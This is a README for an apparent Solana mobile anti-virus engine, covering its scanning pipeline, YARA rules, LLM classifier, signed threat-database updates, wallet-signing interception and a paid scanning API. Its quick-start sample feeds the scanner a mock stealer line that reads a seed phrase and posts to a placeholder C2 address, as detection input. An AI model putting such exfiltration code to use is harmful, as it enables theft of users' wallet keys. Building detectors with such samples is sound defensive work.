# Sync — Solana Mobile Seeker Anti-Virus

> Make the Solana Seeker the safest place to hold and transact crypto on mobile — every app, contract, and transaction screened before it can touch the user's keys.

**Sync** is a mobile-first, AI-powered anti-virus and threat-detection engine purpose-built for the Solana Mobile **Seeker** device. This repository contains the **detection engine core** (`@daemon-blockint/sync-core`) — a portable, dependency-free TypeScript library that runs on a Node backend or embedded in an on-device runtime.

This package implements **Phase 1 (Core Engine)** and **Phase 2 (YARA Integration)** of the PRD roadmap.

## Detection pipeline

```
 App / Contract / Transaction / URL
                │
     ┌──────────▼───────────┐
     │  IntegratedScanner   │
     │  ① Behavioral        │  permissions, network/C2, crypto, binary loads
     │  ② Signature         │  known Solana threat patterns
     │  ③ YARA              │  binary/bytecode pattern matching (8 rules)
     │  ④ LLM (opt-in)      │  contextual analysis hook
     └──────────┬───────────┘
                ▼
     RiskScorer → ReportGenerator → ThreatReport (score, verdict, remediation)
```

## Install & build

```bash
npm install
npm run build      # compile to dist/
npm test           # vitest (19 tests)
npm run demo       # run examples/demo.ts
```

## Quick start

```ts
import { IntegratedScanner } from "@daemon-blockint/sync-core";

const scanner = new IntegratedScanner();

const { report } = scanner.scanLocal({
  id: "com.fake.phantom",
  kind: "app",
  permissions: ["READ_CLIPBOARD", "BIND_ACCESSIBILITY_SERVICE"],
  text: "const seed_phrase = readMnemonic(); fetch('http://1.2.3.4/gate.php')",
});

console.log(report.score, report.severity, report.verdict);
// 99 'critical' 'blocked'
console.log(report.remediation);
```

### Real-time monitoring

```ts
import { IntegratedScanner, Monitor } from "@daemon-blockint/sync-core";

const monitor = new Monitor(new IntegratedScanner(), { alertThreshold: "high" });
monitor.onAlert((a) => pushNotification(a));
monitor.start({ id: "com.some.app", kind: "app", events: [] });
monitor.ingest("com.some.app", { type: "network", timestamp: Date.now(), host: "1.2.3.4" });
```

### LLM threat classifier — Phase 3 (PRD 5.4)

A LangGraph ReAct agent (model + Sync scan tools) escalates ambiguous cases. It
runs on **OpenRouter** (any model slug via `OPENROUTER_MODEL`) and returns
structured `Finding[]` through a mandatory `submit_classification` tool call.

```ts
import { IntegratedScanner, makeLlmClassifier } from "@daemon-blockint/sync-core";

const scanner = new IntegratedScanner({
  llm: makeLlmClassifier(),    // OpenRouter-backed agent (needs OPENROUTER_API_KEY)
  llmEscalationThreshold: 60,  // only escalate above this interim score
});

await scanner.scan(target);    // LLM invoked only above the threshold; failures degrade gracefully
```

Configure via `.env` (see `.env.example`): `OPENROUTER_API_KEY`, `OPENROUTER_MODEL`,
and optional `LANGSMITH_*` for tracing. Run `npm run demo:llm` for a live example.

The `llm` hook accepts any `(target, priorFindings) => Promise<Finding[]>`, so you
can plug in a custom model or pass an injected `BaseChatModel`:

```ts
makeLlmClassifier({ model: myChatModel, llmEscalationThreshold: 50 });
```

### Custom YARA rules (FR-15)

```ts
scanner.ruleManager.add({
  name: "My_Rule",
  category: "malware",
  severity: "high",
  meta: { description: "..." },
  strings: [{ id: "$a", value: "marker", type: "text", nocase: true }],
  condition: { atLeast: 1 },
});
console.log(scanner.ruleManager.exportAll()); // YARA-source export
```

### On-device threat DB + signed OTA updates (§8, FR-8/FR-9)

A local threat-intelligence cache over a pluggable backend (in-memory or
`node:sqlite` with **AES-256-GCM encryption at rest**), updated via **Ed25519-signed
OTA bundles** — unsigned, tampered, or rolled-back bundles are rejected
(PRD §7 "signed rule updates only").

```ts
import {
  ThreatStore, SqliteBackend, OtaUpdater, BundleVerifier,
} from "@daemon-blockint/sync-core";

const store = new ThreatStore(new SqliteBackend({ encryptionKey })); // 32-byte key
const updater = new OtaUpdater(new BundleVerifier({ "sync-2026": publicKeyPem }));

updater.apply(signedBundle, { store, signatureMatcher, ruleManager });
// verifies signature -> enforces monotonic version -> merges threats/signatures/rules

store.scan(target); // Finding[] for any stored indicator matching the target
```

Bundles carry threat records (address / domain / program / hash indicators),
signatures, and YARA rules. Versioning is monotonic (anti-rollback). Run
`npm run demo:threatdb`.

### MWA transaction interception — Phase 4 (§5.5, FR-2)

Sync registers as an MWA **wallet endpoint** (Strategy A), screens every signing
request through the engine, and delegates actual signing to Seed Vault — it
**never custodies keys**. Critical findings block; high findings require explicit
user confirmation.

```ts
import { SyncWalletEndpoint, ScreeningPipeline } from "@daemon-blockint/sync-core";

const endpoint = new SyncWalletEndpoint(seedVault, {           // seedVault: SeedVaultSigner
  pipeline: new ScreeningPipeline({ warnAt: "high", blockAt: "critical" }),
  onWarn: (r) => confirmWithUser(r),                           // return true to proceed
});

await endpoint.authorize({ identityName: "Some dApp" });
const { outcomes } = await endpoint.signTransactions([txBytes]); // screened, then signed
// outcomes[i].signed present if approved; .blockedReason if blocked/declined
```

The pipeline decodes the transaction (`decodeTransaction`), maps it to a
`ScanTarget` (program ids, transfer amounts → behavioral events), scans it, and
returns an `allow` / `warn` / `block` decision. Run `npm run demo:intercept`.

> A lone large/anomalous transfer screens as **high → warn** (the user must
> confirm); very large outflows raise confidence further. Thresholds
> (`warnAt` / `blockAt`) remain configurable.

### Public scanning API + x402 micropayments — Phase 5 (FR-14/16)

A dependency-free HTTP service exposes the engine. Scan routes can be gated
behind [x402](https://x402.org) USDC micropayments (PRD §8 PayAI x402).

```ts
import { SyncApiServer, PaymentGate, HmacPaymentVerifier } from "@daemon-blockint/sync-core";

const gate = new PaymentGate({
  payTo: "<your-USDC-wallet>",
  verifier: new HmacPaymentVerifier(process.env.X402_SECRET!), // swap for a PayAI facilitator in prod
  priceAtomic: "10000", // $0.01 USDC (6 decimals)
});

await new SyncApiServer({ gate }).listen(8787);
```

| Route | Method | Gated | Purpose |
|-------|--------|-------|---------|
| `/health` | GET | no | liveness |
| `/v1/rules` | GET | no | list active YARA rules |
| `/v1/scan/app` | POST | yes | scan an app |
| `/v1/scan/contract` | POST | yes | audit a contract/token |
| `/v1/scan/url` | POST | yes | screen a dApp URL |
| `/v1/scan/text` | POST | yes | scan a text/code blob |

Unpaid requests to gated routes get an x402 `402` challenge:

```jsonc
// 402 Payment Required
{ "x402Version": 1, "error": "payment_required",
  "accepts": [{ "scheme": "exact", "network": "solana", "asset": "<USDC mint>",
                "maxAmountRequired": "10000", "payTo": "...", "resource": "/v1/scan/url" }] }
```

The client retries with a base64 `X-PAYMENT` header; verification is pluggable
via the `PaymentVerifier` interface. Run `npm run serve` (add `X402_SECRET` to
enable gating).

### LLM agent tools (PRD §9)

```ts
import { createAgentTools } from "@daemon-blockint/sync-core";
const tools = createAgentTools(scanner); // scan_app, scan_contract, scan_url, add_yara_rule, ...
```

## Modules

| Module | Class | Responsibility |
|--------|-------|----------------|
| `scanner/` | `BehavioralScanner` | permissions, network/C2, crypto, binary loads (PRD 5.1) |
| `signatures/` | `SignatureMatcher` | known Solana threat-pattern database (PRD 5.2) |
| `yara/` | `YaraScanner`, `RuleManager` | 9 Solana YARA rules (incl. ransomware) + custom rules (PRD 5.3) |
| `analyzer/` | `RiskScorer`, `ReportGenerator` | 0–100 scoring + plain-language reports (PRD §11) |
| `monitor/` | `Monitor` | real-time sessions + alerts (FR-1/FR-3) |
| `integrated-scanner` | `IntegratedScanner` | unified pipeline (PRD §9) |
| `llm/` | `makeLlmClassifier` | LangGraph + OpenRouter classifier (PRD 5.4) |
| `agent-tools` | `createAgentTools` | DeepAgentsJS tool definitions (PRD §9) |
| `api/` | `SyncApiServer`, `PaymentGate` | public scanning API + x402 gating (FR-14/16) |
| `phishing/` | `DomainSpoofDetector` | `.skr` / look-alike domain spoof detection (FR-7/FR-7b) |
| `interception/` | `SyncWalletEndpoint`, `ScreeningPipeline` | MWA tx interception + screening (§5.5, FR-2) |
| `threat-db/` | `ThreatStore`, `OtaUpdater` | on-device SQLite threat cache + signed OTA updates (§8, FR-8/9) |

## Risk scoring

Combined score weights **behavioral (60%)** and **YARA (40%)**, normalized over the layers that fired; a **critical YARA or high-confidence signature match escalates** the overall severity to critical (PRD §11).

| Severity | Score | Verdict |
|----------|-------|---------|
| Critical | 80–100 | blocked |
| High | 60–79 | warn |
| Medium | 40–59 | caution |
| Low | 0–39 | clean |

## Status

Phases 1 & 2 (core engine + YARA), **Phase 3 (LLM classification)**,
**Phase 5 (public scanning API + x402)**, and the **Phase 4 interception core**
(MWA wallet-endpoint screening + transaction decoding) are implemented. The
remaining Phase 4 work is the native Android + Solana Mobile Stack app shell that
hosts this engine.

---

*Sync — Built by Daemon Blockint Technologies. MIT licensed.*
